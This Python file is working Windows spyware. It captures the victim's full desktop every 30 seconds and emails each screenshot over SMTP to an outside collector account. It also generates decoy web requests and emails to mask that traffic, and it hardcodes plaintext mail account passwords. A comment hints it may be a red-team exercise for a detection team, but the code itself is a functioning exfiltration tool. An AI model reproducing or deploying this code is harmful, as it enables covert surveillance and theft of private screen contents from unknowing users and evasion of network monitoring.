from time import sleep
import win32api
import win32con
import win32gui
import win32ui
# from threading import Timer
from datetime import datetime
import random
import smtplib
import imghdr
from email.message import EmailMessage
import os
import requests
from threading import Thread

from list_of_website import websites


time_interval_screen = 30
time_interval_noise_mail =  random.randint(20, 40) # random.randint(2,10)
time_web_noise = random.randint(10, 60)
smpt_server = 'smtp.poczta.onet.pl'
smtp_port = 587
# this design is simplify for detecting team !
smtp_acct = "becyp73@op.pl" # send screenshots
smtp_pass = 'SlavaUkrainie69' # for each same, can be diffrent in (, ) turple, easy for project, team management
screen_tgt_accts = "becyp69@op.pl" # collect screenshots
noise_acct_emails = ['becyp68@op.pl','becyp70@op.pl', "becyp71@op.pl", "becyp72@op.pl" ] # from those email noise is send
tgt_noise = ['becyp68@op.pl', 'becyp70@op.pl', "becyp71@op.pl", "becyp72@op.pl" ]
now = datetime.now() # current date and time

# getting the size of screen, a victim can have multiple monito
# ther is sth wrong 
def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)
   

def screenshot( name = 'screenshot'):
    # making handle for desktop
    hdesktop = win32gui.GetDesktopWindow() 
    width, height, left, top = get_dimensions() # hard code it?


    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    # saveing screenshot as a bitmap
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    name += '.bmp'
    screenshot.SaveBitmapFile(mem_dc, name)
    
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


def screenshot_email(subject):
    print(f"[PREPARE] screenshot mail from {smtp_acct} to {screen_tgt_accts}")
    mailobj = smtplib.SMTP(smpt_server,smtp_port)
    mailobj.ehlo()
    mailobj.starttls()
    mailobj.login(smtp_acct, smtp_pass)
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = smtp_acct
    msg['To'] = screen_tgt_accts # This might be change for biggger address
    msg.set_content(subject)

    screenshot()

    with open('screenshot.bmp', 'rb') as f:
        file_data = f.read()
        file_type = imghdr.what(f.name)
        file_name = f.name
    if os.path.isfile('screenshot.bmp'): # there can be problem
        os.remove('screenshot.bmp')

    msg.add_attachment(file_data, maintype='image', subtype = file_type, filename=file_name)
    mailobj.send_message(msg)
    print(f"screenshot mail from {smtp_acct} sent to {screen_tgt_accts}")
    mailobj.quit()

"""
def process_exists(process_name = "chrome.exe"):
    call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
    # use buildin check_output right away
    output = subprocess.check_output(call).decode()
    # check in last line for process name
    last_line = output.strip().split('\r\n')[-1]
    # because Fail message could be translated
    return last_line.lower().startswith(process_name.lower())
"""

# add noise generator for example, nmap genreator, change mail names for diffrent
# allso send more emails for more random address 

def noise():
    web_addr = websites[random.randint(0,len(websites) -1)]
    try:
        print(requests.get(web_addr))
    except Exception as ex:
        print(ex)
    

def plain_email():
    n_a_e = noise_acct_emails[random.randint(0, len(noise_acct_emails) - 1)]
    t_n = tgt_noise[random.randint(0,len(tgt_noise) -1 )]
    print(f"[PREPARE ]plain mail from {n_a_e} to {t_n}")
    mailobj = smtplib.SMTP(smpt_server, smtp_port)
    mailobj.ehlo()
    mailobj.starttls()
    mailobj.login(n_a_e,smtp_pass)
    now = datetime.now() # current date and time
    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
    msg = f"Subject: Wersja Super Ez \n\n U r n00b when you read it, r3Kt at {date_time}"
    mailobj.sendmail(n_a_e, t_n , msg)
    print(f"plain mail from {n_a_e} sent to {t_n}")
    mailobj.quit()

class Screenshot(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        while True:
            now = datetime.now() # current date and time
            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
            # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
            screenshot_email(date_time)
            print("screenshot sent")
            sleep(time_interval_screen)

class Plainmain(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        while True:
            # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
            plain_email()
            sleep(time_interval_noise_mail)


class Noise(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
        while True:
            # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
            noise()
            sleep(time_web_noise)


if __name__ == '__main__':
    Screenshot()
    Noise()
    Plainmain()
    while True:
        pass
